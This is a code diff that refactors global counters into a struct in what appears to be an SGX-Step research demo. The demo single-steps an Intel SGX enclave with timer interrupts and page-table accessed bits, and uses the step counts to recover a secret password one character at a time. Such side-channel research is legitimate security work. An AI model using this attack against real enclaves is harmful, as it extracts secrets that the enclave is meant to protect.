@@ -10,6 +10,7 @@
 #include "libsgxstep/enclave.h"
 #include "libsgxstep/debug.h"
 #include "libsgxstep/config.h"
+#include "libsgxstep/counter.h"
 #include "libsgxstep/idt.h"
 #include "libsgxstep/config.h"
 #include "libsgxstep/sh.h"
@@ -36,7 +37,6 @@
 #endif
 
 sgx_enclave_id_t eid = 0;
-int irq_cnt = 0, do_irq = 0, fault_cnt = 0, trigger_cnt = 0, step_cnt = 0;
 uint64_t *pte_encl = NULL, *pte_trigger = NULL, *pmd_encl = NULL;
 void *code_adrs, *trigger_adrs;
 
@@ -53,22 +53,22 @@ void aep_cb_func(void)
         uint64_t erip = edbgrd_erip() - (uint64_t) get_enclave_base();
         info("^^ enclave RIP=%#llx; ACCESSED=%d", erip, ACCESSED(*pte_encl));
     #endif
-    irq_cnt++;
+    counter.irq_cnt++;
 
-    if (do_irq && (irq_cnt > NUM_RUNS*1000))
+    if (counter.do_irq && (counter.irq_cnt > NUM_RUNS*1000))
     {
         info("excessive interrupt rate detected (try adjusting timer interval " \
              "to avoid getting stuck in zero-stepping); aborting...");
-	    do_irq = 0;
+	    counter.do_irq = 0;
     }
 
     if (ACCESSED(*pte_encl) && ACCESSED(*pte_trigger))
     {
-        trigger_cnt++;
+        counter.trigger_cnt++;
     }
-    if (trigger_cnt >= 3)
+    if (counter.trigger_cnt >= 3)
     {
-        do_irq = 0;
+        counter.do_irq = 0;
     }
 
     /*
@@ -76,7 +76,7 @@ void aep_cb_func(void)
      * referencing the enclave code page about to be executed, so as to be able
      * to filter out "zero-step" results that won't set the accessed bit.
      */
-    if (do_irq && ACCESSED(*pte_encl)) step_cnt++;
+    if (counter.do_irq && ACCESSED(*pte_encl)) counter.step_cnt++;
     *pte_encl = MARK_NOT_ACCESSED( *pte_encl );
     *pte_trigger = MARK_NOT_ACCESSED(*pte_trigger);
 
@@ -89,7 +89,7 @@ void aep_cb_func(void)
      * enclave instruction.
      * 
      */
-    if (do_irq)
+    if (counter.do_irq)
     {
         *pmd_encl = MARK_NOT_ACCESSED( *pmd_encl );
 #if DO_TIMER_STEP
@@ -111,7 +111,7 @@ void aep_cb_func(void)
 
 /* Called upon SIGSEGV caused by untrusted page tables. */
 void sigsegv_fault_handler(siginfo_t *si, ucontext_t *uc) {
-    ASSERT(fault_cnt++ < 10);
+    ASSERT(counter.fault_cnt++ < 10);
 
 #if DEBUG
     info("Caught page fault (base address=%p)", si->si_addr);
@@ -122,7 +122,7 @@ void sigsegv_fault_handler(siginfo_t *si, ucontext_t *uc) {
         info("Restoring trigger access rights..");
 #endif
         ASSERT(!mprotect(trigger_adrs, 4096, PROT_READ | PROT_WRITE));
-        do_irq = 1;
+        counter.do_irq = 1;
         sgx_step_do_trap = 1;
     } else {
         info("Unknown #PF address!");
@@ -209,21 +209,21 @@ int main( int argc, char **argv )
     {
         for (int j = 0; j < pwd_len; j++) pwd[j] = '*';
         pwd[pwd_len] = '\0';
-        do_irq = 0; trigger_cnt = 0, step_cnt = 0, fault_cnt = 0;
+        counter.do_irq = 0; counter.trigger_cnt = 0, counter.step_cnt = 0, counter.fault_cnt = 0;
         sgx_step_do_trap = 0;
         ASSERT(!mprotect(trigger_adrs, 4096, PROT_NONE ));
         SGX_ASSERT( memcmp_pwd(eid, &pwd_success, pwd) );
 
         #if DEBUG
-            printf("[attacker] steps=%d; guess='%s'\n", step_cnt, pwd);
+            printf("[attacker] steps=%d; guess='%s'\n", counter.step_cnt, pwd);
         #else
-            printf("\r" BLUE_FG COLOR_BOLD "[attacker] steps=%d; " YELLOW_BG "guess='%s'" RESET_BG, step_cnt, pwd);
+            printf("\r" BLUE_FG COLOR_BOLD "[attacker] steps=%d; " YELLOW_BG "guess='%s'" RESET_BG, counter.step_cnt, pwd);
             fflush(stdout);
             for (volatile long int j=0; j < ANIMATION_DELAY; j++); /* delay for animation */
         #endif
 
-        if (pwd_len > 0 && step_cnt > step_cnt_prev) break;
-        step_cnt_prev = step_cnt;
+        if (pwd_len > 0 && counter.step_cnt > step_cnt_prev) break;
+        step_cnt_prev = counter.step_cnt;
     }
     ASSERT( pwd_len < MAX_LEN );
     printf(COLOR_RESET_ALL "\n[attacker] found pwd len = %d\n", pwd_len);
@@ -237,27 +237,27 @@ int main( int argc, char **argv )
         for (int j='A'-1; j<'Z'; j++)
         {
             pwd[i] = j;
-            do_irq = 0; trigger_cnt = 0, step_cnt = 0, fault_cnt = 0;
+            counter.do_irq = 0; counter.trigger_cnt = 0, counter.step_cnt = 0, counter.fault_cnt = 0;
             sgx_step_do_trap = 0;
             ASSERT(!mprotect(trigger_adrs, 4096, PROT_NONE ));
             SGX_ASSERT( memcmp_pwd(eid, &pwd_success, pwd) );
 
             #if DEBUG
-                printf("[attacker] steps=%d; guess='%s --> %s'\n", step_cnt, pwd, pwd_success ? "SUCCESS" : "FAIL");
+                printf("[attacker] steps=%d; guess='%s --> %s'\n", counter.step_cnt, pwd, pwd_success ? "SUCCESS" : "FAIL");
             #else
                 printf("\r" BLUE_FG COLOR_BOLD "[attacker] steps=%d; " YELLOW_BG "guess='%s'" RESET_BG " --> %s",
-                        step_cnt, pwd, pwd_success ? "SUCCESS" : "FAIL   ");
+                        counter.step_cnt, pwd, pwd_success ? "SUCCESS" : "FAIL   ");
                 fflush(stdout);
                 for (volatile long int j=0; j < ANIMATION_DELAY; j++); /* delay for animation */
             #endif
 
-            if (pwd_success || (j >= 'A' && step_cnt > step_cnt_prev)) break;
-            step_cnt_prev = step_cnt;
+            if (pwd_success || (j >= 'A' && counter.step_cnt > step_cnt_prev)) break;
+            step_cnt_prev = counter.step_cnt;
         }
     }
     printf(COLOR_RESET_ALL "\n\n");
 #endif
 
-    info("all done; counted %d/%d IRQs (AEP/IDT)", irq_cnt, __ss_irq_count);
+    info("all done; counted %d/%d IRQs (AEP/IDT)", counter.irq_cnt, __ss_irq_count);
     return 0;
 }
